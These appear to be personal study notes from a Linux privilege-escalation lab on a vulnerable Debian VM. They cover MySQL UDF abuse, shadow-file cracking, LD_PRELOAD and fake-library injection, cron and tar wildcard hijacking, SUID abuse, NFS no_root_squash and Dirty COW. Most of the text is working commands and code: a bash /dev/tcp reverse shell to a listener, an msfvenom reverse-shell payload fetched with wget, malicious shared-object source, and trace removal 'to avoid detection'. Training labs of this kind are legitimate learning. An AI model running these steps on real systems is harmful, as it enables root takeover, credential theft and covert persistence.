## Service Exploits

- There is a Vulnerable Debian VM.
---

- This Process takes advantages of a known vulnerability in MySQL when it runs as root with no password. It leverages **User Defined Functions(UDFs)** to execute system commands with root privileges. Here are steps:
- MySQL **UDF exploit:** allows an attacker to execute arbitrary system commands if they have sufficient privileges.It abuses MySQL's ability to load custom fxns via shared libraries(.so or .dll files).
### Step 1: Change into the MySQL UDF exploit directory
 ```
 cd /home/user/tools/mysql-udf
 ```
--- 
### STEP 2: Compile the exploit code
##### **Why We Created an Object File, Shared Object File, and Shared Library in Step 2**

In Step 2, we compile `raptor_udf2.c` into an object file (`raptor_udf2.o`) and then create a shared object file (`raptor_udf2.so`). Let’s break it down:

---

### **1️⃣ Compiling the C Code into an Object File**

```bash
gcc -g -c raptor_udf2.c -fPIC
```

- `gcc`: The GNU Compiler Collection (GCC) is used to compile the C source code.
- `-g`: Includes debugging information (optional).
- `-c`: Compiles the code into an object file (`raptor_udf2.o`) but does not link it yet.
- `-fPIC`: Generates **Position Independent Code (PIC)**, which is required for shared libraries.

#### **Why?**

- An **object file** (`raptor_udf2.o`) is an intermediate compiled file containing machine code but **not yet linked** into an executable or library.
- The `-fPIC` flag ensures that the compiled code can be loaded at any memory address, which is necessary for creating shared libraries.

---

### **2️⃣ Creating the Shared Object File (Shared Library)**

```bash
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

- `-shared`: Creates a **shared library** (`.so` file), which can be dynamically loaded by programs (like MySQL).
- `-Wl,-soname,raptor_udf2.so`: Passes `-soname,raptor_udf2.so` to the linker (`ld`), setting the shared object's name.
- `-o raptor_udf2.so`: Specifies the output file (`raptor_udf2.so`).
- `raptor_udf2.o`: The compiled object file is linked to create the shared object.
- `-lc`: Links the standard C library (`libc`), which provides essential functions.

#### **Why?**

- **A shared object file (`.so`) is a dynamically loadable library** that can be used by applications at runtime.
- MySQL **requires UDFs to be in shared object format** so that it can dynamically load and execute the function.
- Unlike static libraries (`.a`), shared libraries are loaded into memory only once and can be used by multiple programs simultaneously.

---

### **Summary**

| **Step**   | **File Type**                         | **Purpose**                                  |
| ---------- | ------------------------------------- | -------------------------------------------- |
| **Step 1** | `raptor_udf2.o` (Object File)         | Compiled machine code, not yet linked        |
| **Step 2** | `raptor_udf2.so` (Shared Object File) | A dynamically loadable library used by MySQL |

This process allows us to inject our malicious function (`do_system()`) into MySQL, enabling us to execute system commands as root. 

---
## STEP 3: Connect to MySQL as Root
```
mysql -u root
```
- Since MySQL is running as root with no password, we can log in without authentication.
- Step fail, if MySQL has a password.

---
### STEP 4: Load the exploit into MySQL
```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
```

- `use mysql;`
    
    - Switches to the `mysql` database where user and plugin data are stored.
        
- `create table foo(line blob);`
    
    - Creates a table named `foo` with a single column (`line`) of type `BLOB` (Binary Large Object).
        
- `insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));`
    
    - Loads the contents of the exploit (`raptor_udf2.so`) into the `foo` table.
        
- `select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';`
    
    - Writes the binary data from the `foo` table into the MySQL plugin directory.
        
    - This effectively installs the exploit as a MySQL plugin.
        

---
### STEP 5:  Create a UDF
```
create function do_system returns integer soname 'raptor_udf2.so';

```
- Defines a new MySQL function called `do_system`.
- This function will execute system commands when called.

---
### STEP 6: Execute system commands via the UDF
```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
- The `do_system` function runs the given command as root.
- `cp /bin/bash /tmp/rootbash`: Copies the system’s bash shell to `/tmp/rootbash`.
- `chmod +xs /tmp/rootbash`: Sets the SUID permission, allowing it to run as root.
- **Bash** is a CLI shell that can execute system commands.

---
### STEP 7 : Exit MySQL
```
exit
```
- Leaves the MySQL shell.
---
### STEP 8: Gain a root shell
```
/tmp/rootbash -p
```
- Runs the copied **bash** shell with -p maintaining root privileges.
---
### STEP 9: Clean up
```
rm /tmp/rootbash
exit
```
- `rm /tmp/rootbash`: Removes the malicious shell to avoid detection.
- `exit`: Leaves the root shell.
---


# TASK 3: Weak File Permissions - Readable /etc/shadow

### **Summary: Cracking Root Password from `/etc/shadow`**

1️⃣ **Checked if `/etc/shadow` is world-readable**

```bash
ls -l /etc/shadow
```

- Found that any user can read it (security misconfiguration).

2️⃣ **Viewed the contents of `/etc/shadow`**

```bash
cat /etc/shadow
```

- Extracted the **root user's password hash** (found between the first and second colons `:`).

3️⃣ **Saved the root hash to a file**

```bash
echo '$6$abc123$kPoeu4FOlIm8V/6rPdS2XjGm8ozoBq9lTmAa' > hash.txt
```

4️⃣ **Used John the Ripper to crack the password**

- Unzipped the wordlist if needed:
    
    ```bash
    gzip -d /usr/share/wordlists/rockyou.txt.gz
    ```
    - In my device, I have rockyou.txt.tar.gz , so I need to extract .tar archive, and then gzip using command
     ```
     tar -xvzf rockyou.txt.tar.gz
```
```



- Ran the password cracker:
        ```
    
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt    hash.txt
```
```

```
✅ **Output revealed the cracked password** (e.g., `password123`).

5️⃣ **Gained root access using the cracked password**


```bash
su root
```

- Entered `password123` when prompted.
- Verified root access:
    
    ```bash
    whoami
    root
    ```
    

**Now we have full root privileges!**

---
## Weak file permissions- writable /etc/shadow
`ls -l /etc/shadow`
Generate a new password hash with a password of your choice:

`mkpasswd -m sha-512 newpasswordhere`

Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.

Switch to the root user, using the new password:

`su root`

---
### Weak File Permissions - Writable /etc/passwd
`ls -l /etc/passwd`

Generate a new password hash with a password of your choice:

`openssl passwd newpasswordhere`

Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").

Switch to the root user, using the new password:

`su root`
 or add a newroot at the end of file /etc/passwd.

---
### Task 6 : Sudo - Shell Escape Sequence
### **Shell Escape Sequence - Summary**  

A **shell escape sequence** allows users to break out of a restricted program and access a shell. If run with `sudo`, it can lead to **root access**.  

 **Examples:**  
- `vim`: `:!sh`  
- `less`: Press `v`, then `:!sh`  
- `man`: `!sh`  
- `awk`: `sudo awk 'BEGIN {system("/bin/sh")}'`  
---

## Task 7: Sudo - Environment Variables
## `LD_PRELOAD` and `LD_LIBRARY_PATH` Privilege Escalation**

#### ** General Concept**

- `LD_PRELOAD`: Forces a shared object (`.so` file) to load **before** others when a program runs.
- `LD_LIBRARY_PATH`: Changes where the system looks for shared libraries **before default paths**.

Both can be exploited to **inject malicious code** when running programs with `sudo`.

---

### **🔹  Steps**

1️⃣ **Check Inherited Environment Variables**

- Run `sudo -l` and check for `env_keep+=LD_PRELOAD, LD_LIBRARY_PATH`.
- If these variables are inherited, the system allows potential **library injection**.

2️⃣ **Use `LD_PRELOAD` for Privilege Escalation**

- Compile a **malicious shared object** (`preload.so`):
    
    ```sh
    gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
    ```
    
- Run a **sudo-allowed program** while setting `LD_PRELOAD`:
    
    ```sh
    sudo LD_PRELOAD=/tmp/preload.so program-name-here
    ```
    
- If successful, a **root shell (`#`)** should spawn.

3️⃣ **Find a Library to Replace for `LD_LIBRARY_PATH` Attack**

- Run `ldd /usr/sbin/apache2` to **list shared libraries** used by `apache2`.
- Identify a target library, e.g., `libcrypt.so.1`.

4️⃣ **Compile a Fake Library**

- Write a fake **`libcrypt.so.1`** that **spawns a shell**:
    
    ```c
    #define _GNU_SOURCE
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    
    char *crypt(const char *key, const char *salt) {
        setuid(0);
        setgid(0);
        system("/bin/sh");
        return "root";  // Fake return value
    }
    ```
    
- Compile it:
    
    ```sh
    gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
    ```
    

5️⃣ **Run Apache2 with Fake Library**

```sh
sudo LD_LIBRARY_PATH=/tmp apache2
```

- If successful, **a root shell (`#`) should spawn**.

---

###  **Why Might It Fail?**

- **Function Signature Mismatch**: Ensure the fake library **matches** the real function signature (`man crypt`).
- **Security Restrictions**: Some programs **ignore `LD_LIBRARY_PATH`** for security reasons.
- **Wrong Library Name**: The injected library must have the **exact** name used by `ldd apache2`.

---
##  TASK 8: **Exploiting a World-Writable Cron Job for Privilege Escalation**

This method abuses a **misconfigured cron job** that runs as **root** but allows any user to modify its contents.

---

### **🔹 Step 1: View System-Wide Cron Jobs**

Run:

```sh
cat /etc/crontab
```

This shows scheduled cron jobs. You should see something like:

```
* * * * * root /usr/local/bin/overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

 **Explanation:**

- The first `* * * * *` means the script runs **every minute**.
- The `root` user runs `/usr/local/bin/overwrite.sh`.

If this script is **world-writable**, any user can **replace it with malicious code**.

---

### **🔹 Step 2: Locate the `overwrite.sh` Script**

Run:

```sh
locate overwrite.sh
```

This shows the **full path** of the script.

---

### **🔹 Step 3: Check File Permissions**

Run:

```sh
ls -l /usr/local/bin/overwrite.sh
```

If it’s **world-writable**, you should see:

```
-rwxrwxrwx 1 root root 1234 Mar 21 12:34 /usr/local/bin/overwrite.sh
```

- The `-rwxrwxrwx` means **anyone** can edit it (`777` permissions).

---

### **🔹 Step 4: Replace `overwrite.sh` with a Reverse Shell**

Open the file:

```sh
nano /usr/local/bin/overwrite.sh
```

Replace its content with:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

🔹 **Modify `10.10.10.10`** to your **Kali machine's IP** (`ifconfig` or `ip a`).

Save and **ensure it is executable**:

```sh
chmod +x /usr/local/bin/overwrite.sh
```

---

### **🔹 Step 5: Set Up a Netcat Listener on Your Kali Machine**

On **your Kali machine**, start a listener:

```sh
nc -nvlp 4444
```

- `n` = No DNS resolution
- `v` = Verbose mode
- `l` = Listen mode
- `p 4444` = Listen on **port 4444**

---

### **🔹 Step 6: Wait for the Cron Job to Run**

Since cron runs every minute, after **1 minute**, you should see a **root shell** connect to your Kali box:

```sh
root@victim:/#
```

---
## TASK 9 : Cron Jobs - PATH Environment Variable


### **1️⃣ Check the System-Wide Cron Jobs**

Run:

```sh
cat /etc/crontab
```

Look for a cron job executing scripts from `/home/user` every minute.

---

### **2️⃣ Create `overwrite.sh` in `/home/user`**

Run:

```sh
nano /home/user/overwrite.sh
```

Paste the following code:

```bash
#!/bin/bash

cp /bin/bash /tmp/rootbash  # Copy Bash to /tmp
chmod +xs /tmp/rootbash     # Set SUID bit to allow execution as root
```

Save and exit.

---

### **3️⃣ Make `overwrite.sh` Executable**

Run:

```sh
chmod +x /home/user/overwrite.sh
```

---

### **4️⃣ Wait for the Cron Job to Execute**

- The cron job runs every **minute**, executing `overwrite.sh`.
- This creates `/tmp/rootbash` with **SUID privileges**.

---

### **5️⃣ Gain Root Access**

After a minute, run:

```sh
/tmp/rootbash -p
```

Now, you have **root access**! 

Verify with:

```sh
whoami
id
```

Expected output:

```
root
uid=0(root) gid=0(root) groups=0(root)
```

---

### **6️⃣ Cleanup (Remove Traces)**

```sh
rm /tmp/rootbash
exit
```

---

### TASK 10: Cron Jobs : Wildcards

**Wildcards:** Flexibility in scheduled tasks. Most common (*) wildcard means **every possible value** for a given time field.

- An **arbitrary command** is any command that a user or attacker chooses to execute.
- A **checkpoint** in `tar` is a feature that triggers an action after processing a certain number of files. It is used for progress monitoring but can be abused to execute arbitrary commands.

- `--checkpoint=N` → Sets a checkpoint after processing **N** files.
    
- `--checkpoint-action=exec=<command>` → Executes a command when the checkpoint is reached.
##### ** Privilege Escalation Using Wildcards in Tar (Cron Job Exploit)**

---

### **Step 1: Check Cron Job (On Debian VM - Victim Machine)**

```bash
cat /usr/local/bin/compress.sh
```

🔹 Look for a `tar` command using `*` in `/home/user/`, e.g.:

```bash
tar -cf /backup.tar /home/user/*
```

 **This expands to include all files, allowing us to inject options.**

---

### **Step 2: Generate Reverse Shell Payload (On Kali - Attacker Machine)**

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```

- `LHOST=10.10.10.10` → Kali's IP
- `LPORT=4444` → Listening port for reverse shell

---

### **Step 3: Transfer Payload to Victim Machine**

#### **Option 1: SCP (If SSH Access Available)**

```bash
scp shell.elf user@10.10.29.243:/home/user/
```
**SCP (Secure Copy Protocol)** to transfer a file **from Kali to Debian**
If error:

```bash
scp -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa shell.elf user@10.10.29.243:/home/user/
```

#### **Option 2: Python HTTP Server + Wget (If SCP Fails)**

**On Kali (Host File)**

```bash
python3 -m http.server 8080
```

**On Debian (Download File)**

```bash
wget http://10.10.10.10:8080/shell.elf -O /home/user/shell.elf
```

---

### **Step 4: Make Payload Executable (On Debian VM)**

```bash
chmod +x /home/user/shell.elf
```

---

### **Step 5: Inject Malicious Tar Options (On Debian VM)**

```bash
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

 These filenames **masquerade as tar options** and execute `shell.elf` when `tar` runs.

---

### **Step 6: Start a Netcat Listener (On Kali)**

```bash
nc -nvlp 4444
```

📌 **Must match `LPORT` from `msfvenom`!**

---

### **Step 7: Wait for Cron Job to Execute**

- The `tar` command in the cron job runs automatically.
- Wildcards expand, treating injected filenames as options.
- `tar` executes `shell.elf`, which connects **back to Kali**.
- **On Kali (Netcat Listener Terminal), you get a root shell:**

```bash
whoami
root
```

---
delete files:
`rm /home/user/shell.elf 
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf`

---
## TASK 11: SUID/SGID Executables - Known Exploits

### **Privilege Escalation Using Exim SUID Binary (CVE-2016-1531)**

---

### **1️⃣ Find SUID/SGID Binaries**

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

✔ Searches for **SUID/SGID binaries** that can be exploited.  
✔ Found vulnerable **Exim binary**:

```bash
/usr/sbin/exim-4.84-3
```

---

### **2️⃣ Search for Exploit**

 Look for **CVE-2016-1531** exploit in:

- **Exploit-DB**
- **Google**
- **GitHub**

 **Exploit script already present** on the system:

```bash
/home/user/tools/suid/exim/cve-2016-1531.sh
```

---

### **3️⃣ Execute the Exploit**

🔹 **Make the script executable:**

```bash
chmod +x /home/user/tools/suid/exim/cve-2016-1531.sh
```

🔹 **Run the exploit:**

```bash
/home/user/tools/suid/exim/cve-2016-1531.sh
```

 **Gains root shell (`#` prompt).**

---

### **4️⃣ Verify Root Access**

```bash
whoami
id
```

Output should show **`root`**.

---

## TASK 12: SUID/SGID Executables - Shared Object Injection


### **Step 1: Execute the SUID Binary**

Run the vulnerable SUID binary to observe its normal behavior.

```bash
/usr/local/bin/suid-so
```

You will see a progress bar indicating that it executes normally.

---

### **Step 2: Use `strace` to Identify Missing Shared Objects**

Use `strace` to trace system calls made by the binary and filter for `open`, `access`, and "No such file" errors.

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

This will show attempts to load missing shared objects. From the output, we identify that the binary is trying to load:

```
/home/user/.config/libcalc.so (No such file)
```

This means the binary expects a shared object (`libcalc.so`) in `~/.config/` but cannot find it.

---

### **Step 3: Create the Required Directory**

Since `libcalc.so` should be in `~/.config/`, create the directory if it does not exist:

```bash
mkdir -p /home/user/.config
```

---

### **Step 4: Prepare a Malicious Shared Object**

A sample shared object source file (`libcalc.c`) is provided at:

```
/home/user/tools/suid/libcalc.c
```

This C program likely contains code to spawn a shell. The expected content is:

```c
#include <stdio.h>
#include <stdlib.h>

void __attribute__((constructor)) init() {
    setuid(0);  // Get root privileges
    system("/bin/bash");  // Spawn a root shell
}
```

---

### **Step 5: Compile the Malicious Shared Object**

Compile the `.c` file into a shared object:

```bash
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

- `-shared`: Creates a shared library.
- `-fPIC`: Generates position-independent code.

---

### **Step 6: Execute the SUID Binary Again**

Now, run the vulnerable executable:

```bash
/usr/local/bin/suid-so
```

Since the binary automatically loads `libcalc.so`, it will execute our malicious `init()` function, which spawns a root shell.

---

### **Step 7: Verify Root Access**

You now have a root shell. Verify it with:

```bash
whoami
```

It should return:

```
root
```

---

### **Step 8: Exit the Root Shell**

After testing, exit the root shell to return to normal:

```bash
exit
```

---

### **Summary**

- The SUID binary tries to load a shared object (`libcalc.so`).
- It fails because the file does not exist.
- We create a malicious `libcalc.so` that spawns a shell.
- When the binary loads our shared object, we gain a root shell.
---
### TASK 13: SUID/GUID Executables - Environmental Variables

 **exploiting a SUID binary** due to **uncontrolled PATH variable usage**. 
### **Understanding the Vulnerability**

- The **SUID binary** `/usr/local/bin/suid-env` runs with **root privileges**.
- It **calls `service apache2 start`**, but **does not specify the full path** (`/usr/sbin/service`).
- Because of this, it **searches for `service` using the user's PATH**.
- We can **exploit this by placing a malicious `service` executable** earlier in the PATH.

---

### **Exploitation Steps**

1. **Analyze the binary behavior:**
    
    ```bash
    /usr/local/bin/suid-env
    ```
    
    - This attempts to start `apache2`, showing that it's calling `service`.
2. **Check for absolute path usage:**
    
    ```bash
    strings /usr/local/bin/suid-env
    ```
    
    - If we find `"service apache2 start"`, it confirms the binary is using `service` without an absolute path.
3. **Create a malicious `service` executable**:
    
    - The code inside `/home/user/tools/suid/service.c` is likely:
        
        ```c
        #include <stdio.h>
        #include <stdlib.h>
        
        int main() {
            setuid(0);
            system("/bin/bash");
            return 0;
        }
        ```
        
    - Compile it:
        
        ```bash
        gcc -o service /home/user/tools/suid/service.c
        ```
        
4. **Modify the PATH variable to prioritize our malicious executable**:
    
    ```bash
    PATH=.:$PATH
    ```
    
5. **Execute the vulnerable SUID binary**:
    
    ```bash
    /usr/local/bin/suid-env
    ```
    
    - Since `.` (current directory) is now **first in PATH**, our fake `service` executes instead of `/usr/sbin/service`.
    - This spawns a **root shell**.
6. **Confirm root access**:
    
    ```bash
    whoami
    ```
    
    - It should return `root`.
7. **Exit the root shell to avoid detection**:
    
    ```bash
    exit
    ```
    

---

## TASK 14: SUID / SGID Executables - Abusing Shell Features (#1)
This exploit leverages a **vulnerability in older Bash versions (<4.2-048)** where functions with **absolute path names** can override system binaries. Here’s how and why it works:

---

### **Understanding the Vulnerability**

- **The binary `/usr/local/bin/suid-env2` is SUID-root** but it **uses the absolute path** `/usr/sbin/service` to start Apache.
- Normally, this should prevent **PATH-based hijacking** (like in the previous exploit).
- However, **Bash versions before 4.2-048** allow exporting a function with a **name that matches a file path**.
- This means we can **override `/usr/sbin/service`** with a function that spawns a root shell.

---

### **Exploitation Steps**

1. **Confirm the binary calls `/usr/sbin/service` explicitly**:
    
    ```bash
    strings /usr/local/bin/suid-env2
    ```
    
    - If `"service apache2 start"` is present, but using `/usr/sbin/service`, we confirm it **cannot be hijacked using PATH**.
2. **Check Bash version**:
    
    ```bash
    /bin/bash --version
    ```
    
    - If the version is **lower than 4.2-048**, the exploit is possible.
3. **Create a malicious function named `/usr/sbin/service`**:
    
    ```bash
    function /usr/sbin/service { /bin/bash -p; }
    ```
    
    - This function calls **`/bin/bash -p`**, which preserves **SUID privileges**.
4. **Export the function**:
    
    ```bash
    export -f /usr/sbin/service
    ```
    
    - This ensures that **any command executing `/usr/sbin/service`** will actually **run our function** instead.
5. **Run the vulnerable binary to escalate privileges**:
    
    ```bash
    /usr/local/bin/suid-env2
    ```
    
    - Since the function is exported, `/usr/sbin/service` is now **a function instead of a binary**.
    - Instead of starting Apache, it **spawns a root shell**.
6. **Verify root access**:
    
    ```bash
    whoami
    ```
    
    - Should return `root`.
7. **Exit the root shell**:
    
    ```bash
    exit
    ```
    

---

### **Why This Works**

- Older Bash versions **prioritize exported functions** over binaries **even when full paths are used**.
- When the SUID binary calls `/usr/sbin/service`, our function **runs instead of the actual binary**.

---
## Task 15: SUID / SGID Executables - Abusing Shell Features (#2)
In the debug output of your command, **Bash printed each executed command line with a `+` prefix before running it.** However, in your provided output, the `+` debug traces are missing. This could be due to terminal formatting or log capture differences.

If `xtrace` (`set -x`) was enabled properly, Bash should have printed **each command before execution**, including the `PS4` value expansion.

---

### **Where Did Bash First Print the Code?**

1. **When `PS4` is evaluated**
    
    - `PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)'`
    - Before printing any debug information, Bash **evaluates the command inside `$()`**.
    - This means **the `cp` and `chmod` commands execute first**, creating the SUID root Bash.
2. **Before executing `suid-env2`**
    
    - Bash should have printed:
        
        ```
        + /usr/local/bin/suid-env2
        ```
        
    - However, since `PS4` was set to contain a **command substitution (`$()`), that command runs before** Bash prints debug traces.
3. **Inside `suid-env2` execution**
    
    - The service command (`service apache2 start`) is executed.
    - The debug traces inside the `service` script (`basename`, `case`, `shift`, etc.) are printed **before execution**.

---

### **Key Takeaway**

- **The exploit works because `PS4` is evaluated before any debug output is printed.**
- The first command Bash prints is from `suid-env2`, but **the malicious `cp` and `chmod` already executed** before that.
- Since `SHELLOPTS=xtrace` forces **every command** to be logged, you can observe the step-by-step execution.

---
## Task 16: Passwords & Keys - History Files

If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.

View the contents of all the hidden history files in the user's home directory:

`cat ~/.*history | less`

Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. Note that there is no space between the -p option and the password!

Switch to the root user, using the password:

`su root`

---
## Task 17: Passwords & Keys - Config Files

Config files often contain passwords in plaintext or other reversible formats.

List the contents of the user's home directory:

`ls /home/user`

Note the presence of a **myvpn.ovpn** config file. View the contents of the file:

`cat /home/user/myvpn.ovpn`

The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials:

`su root`


---
## TASK 18: Passwords & Keys - SSH Keys
### **Exploiting World-Readable SSH Key for Privilege Escalation**

This technique involves finding an **improperly secured SSH private key** and using it to log in as the **root user** on a remote Debian machine.

---

## **Step 1: Locate Hidden Files and Directories**

First, check for any hidden files and directories (`.` prefixed files) in the **system root (`/`)**:

```bash
ls -la /
```

### **Expected Output**

```bash
drwxr-xr-x  18 root root  4096 Mar 23 10:00 .
drwxr-xr-x  18 root root  4096 Mar 23 10:00 ..
drwx------   2 root root  4096 Mar 23 09:55 .ssh
```

- The `.ssh` directory is present but should **only be readable by root**.
- If the directory permissions are `drwxr-xr-x`, it means **any user can enter** and **list** its contents.

---

## **Step 2: Check the `.ssh` Directory**

List the contents of `/root/.ssh`:

```bash
ls -l /.ssh
```

### **Expected Output**

```bash
-rw-r--r--  1 root root  1679 Mar 23 09:55 root_key
```

- **The `root_key` file is world-readable (`-rw-r--r--`)**.
- **This is a security misconfiguration**, allowing non-root users to read the private key.

---

## **Step 3: Extract and Transfer the Key**

### **Method 1: Direct Copy-Paste**

1. **View the key's contents**:
    
    ```bash
    cat /.ssh/root_key
    ```
    
    - It should look something like this:
        
        ```
        -----BEGIN RSA PRIVATE KEY-----
        MIIEpAIBAAKCAQEA7...
        ...
        -----END RSA PRIVATE KEY-----
        ```
        
2. **Copy the entire key** and **paste it into a new file on your Kali box**:
    
    ```bash
    nano root_key
    ```
    
3. **Save and exit** (`Ctrl + X`, `Y`, `Enter`).

### **Method 2: Use SCP (if possible)**

If the `scp` command is allowed, you can copy the key directly:

```bash
scp root@10.10.167.176:/root/.ssh/root_key .
```

However, since we don't have direct root SSH access yet, **Method 1 is preferred**.

---

## **Step 4: Set Correct Permissions**

SSH clients require private keys to have **restricted permissions**:

```bash
chmod 600 root_key
```

This ensures **only the owner (you) can read/write** the key (`-rw-------`).

---

## **Step 5: SSH Into the Debian VM as Root**

Older Debian systems may **only support older RSA key types**. We specify them explicitly:

```bash
ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.167.176
```

### **Breakdown of SSH Command:**

- `-i root_key` → Use the private key for authentication.
- `-oPubkeyAcceptedKeyTypes=+ssh-rsa` → Accept old `ssh-rsa` key types.
- `-oHostKeyAlgorithms=+ssh-rsa` → Allow old host key verification.
- IP - target IP

### **Expected Output**

```bash
root@debian:~# whoami
root
```

## **Step 6: Cleanup**

For stealth and security, **remove the private key**:

```bash
rm root_key
```

Exit the root shell:

```bash
exit
```

---

## TASK 19: NFS
## **NFS Exploitation: Privilege Escalation via Root Squashing Disabled**

This exploit takes advantage of **NFS misconfiguration**, where **root squashing is disabled** in `/etc/exports`, allowing us to **create an SUID-root binary remotely** and execute it on the target system for **root access**.

---

### ** Understanding Key Concepts**

1. **NFS (Network File System)**
    
    - Allows remote systems to share directories.
    - Files created **retain the same user ID (UID)** as the creator.
2. **Root Squashing**
    
    - Normally, if a file is created by `root` on an NFS share, it is assigned to the **"nobody"** user (to prevent privilege escalation).
    - **If root squashing is disabled**, root-created files **retain root privileges**, which is a serious security risk.
3. **SUID (Set User ID) Binary**
    
    - If a binary has **SUID bit set (`chmod +s`)**, it executes **with the privileges of the file owner**.
    - This allows a **low-privileged user** to execute a root-owned SUID binary and escalate to root.

---

## **🛠 Exploitation Steps**

### **Step 1️⃣: Check NFS Configuration on Target (Debian VM)**

Log into the Debian VM and check the **NFS export settings**:

```bash
cat /etc/exports
```

 **Example Output:**

```
/tmp *(rw,no_root_squash)
```

- **`rw`** → Read & write access.
- **`no_root_squash`** → Root files retain **UID=0 (root)** when created remotely.  
    This means we can create a **root-owned SUID file** from our attacker machine (Kali).

---

### **Step 2️⃣: Switch to Root on Kali (Attacker Machine)**

```bash
sudo su
```

This ensures all created files on the NFS share are owned by **root**.

---

### **Step 3️⃣: Mount the NFS Share on Kali**

We create a **mount point** on our Kali box and mount the `/tmp` directory from the target Debian VM:

```bash
mkdir /tmp/nfs
mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs
```

📌 **Breaking it Down:**

- `-o rw` → Mounts with **read & write** permissions.
- `vers=3` → Specifies **NFS version 3**.
- `10.10.10.10:/tmp` → Mounts the **/tmp share** from the **Debian VM** to **Kali’s `/tmp/nfs`** directory.

✅ Now, any file **created in `/tmp/nfs` on Kali** will **appear in `/tmp` on Debian VM**.

---

### **Step 4️⃣: Generate a Malicious SUID Shell with msfvenom**

We create a **payload** that spawns a root shell:

```bash
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

📌 **Breaking it Down:**

- `-p linux/x86/exec CMD="/bin/bash -p"` → Generates a payload that executes **`/bin/bash -p`**.
- `-f elf` → Formats the output as a **Linux ELF binary**.
- `-o /tmp/nfs/shell.elf` → Saves the binary to **our mounted NFS share**.

✅ The file `/tmp/nfs/shell.elf` now appears in **`/tmp/shell.elf` on Debian VM**.

---

### **Step 5️⃣: Make the Payload Executable & Set SUID Bit**

```bash
chmod +xs /tmp/nfs/shell.elf
```

📌 **What This Does:**

- `+x` → Makes it **executable**.
- `+s` → Sets the **SUID bit**, meaning it will execute **with the privileges of its owner (root)**.

✅ This ensures that when a **low-privileged user** executes it on the **Debian VM**, the payload runs **as root**.

---

### **Step 6️⃣: Execute the SUID Shell on the Debian VM**

Switch back to the **Debian VM** as a low-privileged user and **run the payload**:

```bash
/tmp/shell.elf
```

✅ **Expected Outcome:**  
You should now have a **root shell**:

```bash
whoami
root
```

---

### **Step 7️⃣: Cleanup**

To **avoid detection**, remove the shell binary:

```bash
rm /tmp/shell.elf
exit
```

---

## TASK 20: Kernel Exploits
### **Kernel Exploit: Dirty COW (CVE-2016-5195)**

"Dirty COW" is a **privilege escalation vulnerability** in the Linux kernel that allows an unprivileged user to **gain root access** by exploiting a race condition in the `copy-on-write (COW)` mechanism.

---

## **🛠️ Step-by-Step Walkthrough**

### **🔎 Step 1: Identify Kernel Exploits**

Before running a kernel exploit, we first check which vulnerabilities exist on the system.

#### **Run Linux Exploit Suggester 2**

```bash
perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
```

- This script analyzes the kernel version and suggests possible **exploits**.
- If `Dirty COW (CVE-2016-5195)` is listed, the system is vulnerable.

---

### **🛠️ Step 2: Exploiting Dirty COW**

The **exploit code** is already available in the system at:

```bash
/home/user/tools/kernel-exploits/dirtycow/c0w.c
```

This exploit **replaces** the `SUID` binary `/usr/bin/passwd` with a malicious version that spawns a root shell.

#### **1️⃣ Compile the Dirty COW exploit**

```bash
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
```

- `gcc`: Compiles the C program.
- `-pthread`: Uses multi-threading to speed up the attack.
- `-o c0w`: Creates an executable named `c0w`.

#### **2️⃣ Run the Exploit**

```bash
./c0w
```

- This **replaces** `/usr/bin/passwd` with a malicious binary.
- **Backup of `/usr/bin/passwd` is stored in `/tmp/bak`.**

---

### **🎯 Step 3: Gain Root Access**

Now, we can use the infected `passwd` binary to **spawn a root shell**.

```bash
/usr/bin/passwd
```

🚀 **BOOM! You are now root.** 🚀  
To confirm:

```bash
whoami
```

✔ Output should be: `root`

---

### **🛠️ Step 4: Restore the System**

Since **kernel exploits can make the system unstable**, we must **restore** the original `passwd` binary and exit the root shell.

#### **Restore the Original `passwd` File**

```bash
mv /tmp/bak /usr/bin/passwd
```

#### **Exit Root Shell**

```bash
exit
```

---

## TASK 21: 